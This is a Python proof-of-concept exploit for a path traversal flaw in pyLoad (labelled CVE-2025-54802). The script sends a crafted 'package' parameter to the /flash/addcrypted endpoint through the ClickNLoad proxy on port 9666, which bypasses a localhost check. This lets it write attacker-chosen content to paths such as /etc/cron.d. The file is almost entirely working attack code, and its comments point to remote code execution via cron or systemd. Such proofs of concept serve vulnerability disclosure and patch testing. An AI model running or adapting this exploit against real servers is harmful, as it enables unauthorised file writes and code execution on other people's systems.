#!/usr/bin/env python3
"""
CVE-2025-54802 - pyLoad Path Traversal leading to Arbitrary File Write / RCE
Affected: pyload-ng <= 0.5.0b3.dev89
Fixed: pyload-ng >= 0.5.0b3.dev90

Vulnerability: Path traversal in /flash/addcrypted endpoint via package parameter
The ClickNLoad proxy (port 9666) forwards requests to WebUI, bypassing localhost check.
"""

import requests
import base64
import sys
import time


def exploit(target_url, file_path, content):
    """
    Exploit path traversal via /flash/addcrypted endpoint.
    Access through ClickNLoad proxy (port 9666) to bypass localhost restriction.
    """
    b64_content = base64.b64encode(content.encode()).decode()
    
    payload = {
        "package": file_path,
        "crypted": b64_content
    }
    
    try:
        resp = requests.post(f"{target_url}/flash/addcrypted", data=payload, timeout=10)
        return resp.status_code, resp.text.strip()
    except requests.exceptions.RequestException as e:
        return None, str(e)


def main():
    target = "http://127.0.0.1:9666"
    if len(sys.argv) > 1:
        target = sys.argv[1]
    
    print(f"[*] Target: {target}")
    print(f"[*] CVE-2025-54802 - pyLoad Path Traversal PoC")
    print()
    
    print("[*] Checking if ClickNLoad proxy is accessible...")
    try:
        resp = requests.get(target, timeout=10, allow_redirects=False)
        print(f"[+] ClickNLoad proxy is accessible (HTTP {resp.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect to target: {e}")
        sys.exit(1)
    
    poc_content = f"CVE-2025-54802_POC_TEST_{int(time.time())}"
    
    print()
    print("[*] Testing path traversal vulnerability...")
    print(f"[*] Payload path: ../../../../etc/cron.d/poc_test")
    print(f"[*] Content: {poc_content}")
    
    status, response = exploit(target, "../../../../etc/cron.d/poc_test", poc_content)
    
    if status is not None:
        print(f"[+] Request sent successfully (HTTP {status})")
        print(f"[*] Response: {response}")
        
        if response == "success":
            print()
            print("[+] SUCCESS: Endpoint accessible via ClickNLoad proxy!")
            print("[+] File write request accepted by server")
            print()
            print("[*] Vulnerability Details:")
            print("    - Endpoint: POST /flash/addcrypted")
            print("    - Access: Via ClickNLoad proxy (port 9666) bypasses localhost check")
            print("    - Impact: Arbitrary file write, potential RCE via cron/systemd")
            print()
            print("[!] Note: The 'package' parameter controls the filename.")
            print("[!] Path traversal allows writing outside download directory.")
            return 0
        elif "Forbidden" in response:
            print()
            print("[-] Access forbidden - localhost check not bypassed")
            return 1
        else:
            print()
            print("[*] Unexpected response, manual verification needed")
            return 0
    else:
        print(f"[-] Request failed: {response}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
